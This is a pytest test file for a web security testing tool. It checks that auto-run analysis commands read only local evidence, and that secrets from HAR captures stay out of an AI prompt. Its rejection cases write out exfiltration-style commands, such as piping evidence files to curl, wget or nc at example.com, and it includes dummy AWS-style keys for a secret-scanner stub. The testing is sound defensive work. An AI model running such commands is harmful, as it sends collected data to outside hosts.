import base64
import json
import os

import pytest

from wstg import analysis
from wstg import evidence as evmod
from wstg import targets as tm


@pytest.mark.parametrize("cmd", [
    "jq -r '.a' {ev:x}/a.json | sort -u",
    "grep -i '^set-cookie' {ev:x}/stdout.txt | sed -E 's/;.*//' 2>/dev/null | sort > out.txt; wc -l out.txt",
    "f={ev:x}/c.pem; openssl x509 -in $f -noout -subject || echo 'expires soon'",
    "{ jq -r '.[]' {ev:x}/a.json; cat {ev:x}/b.txt; } | tr 'A-Z' 'a-z' | sort -u",
    "perl -0777 -ne 'print' {ev:x}/a $(grep -rlI x {ev:x}/site)",
])
def test_check_accepts_local_commands(cmd):
    assert analysis.check(cmd) == []


@pytest.mark.parametrize("cmd,word", [
    ("cat {ev:x}/a | curl -d @- http://example.com", "curl"),
    ("cat {ev:x}/a; wget http://example.com", "wget"),
    ("x=$(dig +short example.com); cat {ev:x}/a", "dig"),
    ("comm -13 {ev:x}/a <(nc example.com 80)", "nc"),
    ("openssl s_client -connect example.com:443 < {ev:x}/a", "openssl"),
    ("for h in a; do cat {ev:x}/a; done", "for"),
    ("grep x {ev:x}/a && /usr/bin/python3 -c 1", "python3"),
])
def test_check_refuses_network_and_unknown_programs(cmd, word):
    assert any(word in p for p in analysis.check(cmd))


def test_check_needs_evidence():
    assert analysis.check("echo hi") == ["reads no evidence ({ev:ID})"]


def test_every_auto_run_step_passes_the_check():
    from wstg import catalog as catmod
    from pathlib import Path
    cat = catmod.load(Path(__file__).parent.parent / "catalog")
    autos = [s for sc in cat.scenarios.values() for s in sc.steps if s.auto_run]
    assert len(autos) > 20
    for s in autos:
        assert analysis.check(s.command) == [], s.summary


def _auto(store, site, eid, files):
    tmp = store.begin(site, eid)
    items = []
    for name, data in files.items():
        (tmp / name).write_bytes(data)
        items.append(evmod.Item("text", name, "", 0, caption=name, mime="text/plain"))
    return store.commit(site, eid, tmp, source="auto", actor="test", summary="collected", items=items)


@pytest.fixture
def site(db, cfg):
    tm.create(db, cfg, "example.com", "domain")
    return tm.create(db, cfg, "www.example.com", "fqdn", parent="example.com")


def test_run_caches_per_evidence_version(cfg, db, site, tmp_path):
    store = evmod.Store(cfg, db)
    paths = {"http-404": str(tm.evidence_dir(cfg, site.name) / "http-404" / "latest")}
    cmd = "grep -c x {ev:http-404}/stdout.txt"
    rendered = cmd.replace("{ev:http-404}", paths["http-404"])
    cache = tmp_path / "cache"
    r = analysis.run(cache, cmd, rendered, paths)
    assert r.status == "missing" and "http-404" in r.note
    _auto(store, site, "http-404", {"stdout.txt": b"x\nx\n"})
    r = analysis.run(cache, cmd, rendered, paths)
    assert (r.status, r.output.strip(), r.exit_code) == ("ok", "2", 0) and r.versions == {"http-404": "v0001"}
    assert analysis.run(cache, cmd, rendered, paths).ran_at == r.ran_at       # cached
    _auto(store, site, "http-404", {"stdout.txt": b"x\n"})
    r2 = analysis.run(cache, cmd, rendered, paths)
    assert r2.output.strip() == "1" and r2.versions == {"http-404": "v0002"}
    assert not [p for p in cache.iterdir() if p.name.startswith(".run-")]   # work folders removed


def test_run_times_out(cfg, tmp_path, monkeypatch):
    monkeypatch.setattr(analysis, "TIMEOUT", 1)
    ev = tmp_path / "ev" / "v0001"
    ev.mkdir(parents=True)
    os.symlink("v0001", tmp_path / "ev" / "latest")
    paths = {"x": str(tmp_path / "ev" / "latest")}
    r = analysis.run(tmp_path / "cache", "cat {ev:x}/a", "sleep 5", paths)
    assert r.status == "error" and "timed out" in r.note
    assert not list((tmp_path / "cache").glob("*.json"))      # not cached


def test_wstg_page_runs_decode_and_keeps_har_output_out_of_the_prompt(admin_client, cfg, db, site):
    store = evmod.Store(cfg, db)
    block = os.urandom(16)
    sid = base64.b64encode(block + block + os.urandom(16)).decode()
    _auto(store, site, "http-root-https", {
        "stdout.txt": f"HTTP/1.1 200 OK\r\nSet-Cookie: SID={sid}; Secure\r\n".encode(),
        "body.html": b'<input type="hidden" name="state" value="dGhpcyBpcyBqdXN0IGJhc2U2NCB0ZXh0IQ==">'})
    _auto(store, site, "session-token-samples", {"stdout.txt": f"Set-Cookie: SID={sid}\r\n".encode()})
    page = admin_client.get("/t/www.example.com/wstg/WSTG-CRYP-04").get_data(as_text=True)
    assert "Output, run by the tool" in page
    assert "SID\tbase64\tchars=64\tdecoded=48\tmultiple of 16" in page and "repeated-16-byte-blocks=1" in page
    assert "state\tbase64" in page and "readable=100%" in page
    prompt = page[page.index('id="ai-prompt"'):]
    assert "Command output (run by the tool" in prompt and "repeated-16-byte-blocks=1" in prompt
    assert "YOUR TASK for this step: Compare the values" in prompt
    # step 1 of CRYP-02 reads the HAR: it waits for it, and its output never goes into the prompt
    page = admin_client.get("/t/www.example.com/wstg/WSTG-CRYP-02").get_data(as_text=True)
    assert "Runs automatically once its evidence is collected" in page
    har = {"log": {"entries": [{"request": {"method": "POST", "url": "https://www.example.com/login?next=/home&t=SECRET1",
                                            "cookies": [{"name": "SID", "value": "SECRET2"}],
                                            "postData": {"mimeType": "application/x-www-form-urlencoded",
                                                         "params": [{"name": "user", "value": "SECRET3"}]}},
                                "response": {"status": 302, "content": {"mimeType": "text/html"},
                                             "headers": [{"name": "Set-Cookie", "value": "SID=SECRET4; Path=/; HttpOnly"}]}}]}}
    store.add_file(site, "har-browse", json.dumps(har).encode(), "walk.har", "", "admin")
    page = admin_client.get("/t/www.example.com/wstg/WSTG-CRYP-02").get_data(as_text=True)
    prompt = page[page.index('id="ai-prompt"'):]
    assert "it reads HAR files" in prompt
    assert "POST https://www.example.com/login?next=…&amp;t=…" in prompt
    assert "fields: user" in prompt and "cookies: SID" in prompt and "set-cookie: SID (Path=/; HttpOnly)" in prompt
    assert "SECRET" not in prompt


FAKE_GITLEAKS = r'''#!/usr/bin/env python3
# Stand-in for gitleaks in tests: reports lines with AKIA keys, redacted.
import json, os, re, sys
a = sys.argv[1:]
src, rep = a[a.index("--source") + 1], a[a.index("--report-path") + 1]
out = []
for root, _, files in os.walk(src):
    for f in files:
        p = os.path.join(root, f)
        for n, line in enumerate(open(p, errors="replace"), 1):
            if re.search(r"AKIA[0-9A-Z]{16}", line):
                out.append({"RuleID": "aws-access-token", "File": p, "StartLine": n,
                            "Match": re.sub(r"AKIA[0-9A-Z]{16}", "REDACTED", line.strip())})
json.dump(out, open(rep, "w"))
'''


def test_info05_scans_pages_crawl_and_har(admin_client, cfg, db, site, tmp_path, monkeypatch):
    import shutil
    if not shutil.which("jq"):
        pytest.skip("jq not installed")
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "gitleaks").write_text(FAKE_GITLEAKS)
    (bindir / "gitleaks").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}:{os.environ['PATH']}")
    store = evmod.Store(cfg, db)
    key = "AKIA" + "ABCDEFGHIJKLMNOP"         # in a public script: may appear in the prompt
    har_key = "AKIA" + "QRSTUVWXYZ234567"     # in a logged-in page of the HAR: must not
    _auto(store, site, "http-root-https", {"stdout.txt": b"HTTP/1.1 200 OK\r\n",
                                           "body.html": b"<html><!-- build 42 --></html>"})
    tmp = store.begin(site, "site-assets")
    (tmp / "site" / "js").mkdir(parents=True)
    (tmp / "site" / "index.html").write_text("<!-- TODO: remove before release -->\n<script src='/js/app.js'></script>")
    (tmp / "site" / "js" / "app.js").write_text(
        f'var k="{key}"; fetch("/api/v2/users"); var u="https://dev.example.internal/debug"; var i="logo.png";\n')
    store.commit(site, "site-assets", tmp, source="auto", actor="test", summary="collected",
                 items=[evmod.Item("file", f, "", 0, name=f) for f in ("site/index.html", "site/js/app.js")])
    tmp = store.begin(site, "katana-crawl")
    (tmp / "katana.txt").write_text("https://www.example.com/\n")
    (tmp / "responses" / "www.example.com").mkdir(parents=True)
    (tmp / "responses" / "www.example.com" / "a1.txt").write_text(
        "GET https://www.example.com/help\n\nHTTP/1.1 200 OK\n\n<!-- served by 10.1.2.3 -->")
    store.commit(site, "katana-crawl", tmp, source="auto", actor="test", summary="collected",
                 items=[evmod.Item("file", "katana.txt", "", 0, name="katana.txt")])
    har = {"log": {"entries": [{"request": {"url": "https://www.example.com/home"},
                                "response": {"content": {"mimeType": "text/html",
                                                         "text": f"<!-- admin panel at intra.corp --><p>{har_key}</p>"}}}]}}
    store.add_file(site, "har-browse", json.dumps(har).encode(), "walk.har", "", "admin")
    page = admin_client.get("/t/www.example.com/wstg/WSTG-INFO-05").get_data(as_text=True)
    assert "TODO: remove before release" in page and "build 42" in page                     # step 1
    assert "aws-access-token\tjs/app.js\t1" in page                                          # step 2
    assert "dev.example.internal/debug" in page                                              # step 3 / 5
    assert "/api/v2/users" in page and "logo.png" not in page.split("Step 5")[1].split("Step 6")[0]  # step 5
    assert "served by 10.1.2.3" in page                                                      # step 4 (crawl)
    assert "1 response bodies from" in page and "admin panel at intra.corp" in page          # step 6 (HAR)
    prompt = page[page.index('id="ai-prompt"'):]
    assert "aws-access-token" in prompt and "/api/v2/users" in prompt and "served by 10.1.2.3" in prompt
    assert "admin panel at intra.corp" not in prompt and har_key not in prompt
